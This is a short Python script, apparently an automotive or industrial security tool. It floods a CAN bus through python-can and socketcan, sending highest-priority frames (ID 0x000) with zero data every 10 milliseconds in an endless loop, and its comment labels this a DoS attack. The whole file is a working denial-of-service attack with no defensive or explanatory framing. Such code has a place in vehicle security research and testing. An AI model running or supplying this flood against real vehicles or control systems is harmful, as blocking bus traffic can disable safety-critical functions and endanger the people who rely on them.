import can
import time

bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Define the ID of the message you want to target for DoS attack
message_id = 0x000

def main():
    try:
        while True:
            # Create a CAN message with dummy data
            data = [0, 0, 0, 0, 0, 0, 0, 0]
            msg = can.Message(arbitration_id=message_id, data=data, is_extended_id=False)
            
            # Send the message
            bus.send(msg)
            time.sleep(0.01)  # Adjust delay as needed
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
